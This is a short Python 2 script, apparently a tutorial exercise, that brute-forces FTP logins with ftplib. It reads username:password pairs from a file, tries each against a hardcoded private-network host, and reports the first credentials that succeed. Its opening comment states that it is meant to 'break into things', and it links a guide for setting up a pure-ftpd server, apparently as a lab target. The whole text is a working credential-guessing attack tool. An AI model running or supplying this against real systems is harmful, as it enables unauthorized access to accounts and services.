#This will use user/password lists to break into things
#This is a good guide for setting up pure-ftpd
#http://articlebin.michaelmilette.com/setting-up-pure-ftpd-in-ubuntu/

#First import your module
import ftplib

#define your function
def bruteLogin(hostname, passwdFile):

#open a file to read, we'll define that later.
    pF = open(passwdFile, 'r')

#for loop operation on each line of file
    for line in pF.readlines():
#split the file, username is before :, password is what's after it and strip
#new line characters. file should be in unix format.
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print "[+] Trying: "+userName+"/"+passWord

#So we got our stuff, let's use it.
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) + 'FTP Logon Succeeded!: ' \
                +userName+"/"+passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force ftp credentials.'
    return (None, None)
host = '192.168.1.82'
passwdFile = 'passwords'
bruteLogin(host, passwdFile)
